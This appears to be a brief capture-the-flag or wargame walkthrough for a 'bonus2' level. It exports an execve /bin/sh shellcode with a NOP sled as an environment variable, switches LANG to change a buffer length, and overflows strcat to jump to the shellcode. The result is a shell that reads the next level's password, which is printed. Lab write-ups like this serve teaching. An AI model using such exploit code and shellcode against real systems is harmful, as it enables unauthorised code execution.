get the binary on host
* `scp -P 4242 bonus2@192.168.56.107:./bonus2 ./binary/bonus2`

decompile using ghidras

Source are in source.c 

let's use our global shellcoe again\
`export SHELLCODE=$(python -c "print '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")`

let's set the funnyest langage \
`export LANG=nl`

Get shellcode addr\
`/tmp/get_env SHELLCODE`\
got `0xbffff837`


let's exploit the strcat to perform our exploit

we use the second arg to add our shellcode just need to find the offset for arg2, dichotomy time !

```
./bonus2 $(python -c "print 'a' * 40") $(python -c "print 'a' * 23 + '\x37\xf8\xff\xbf'")
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```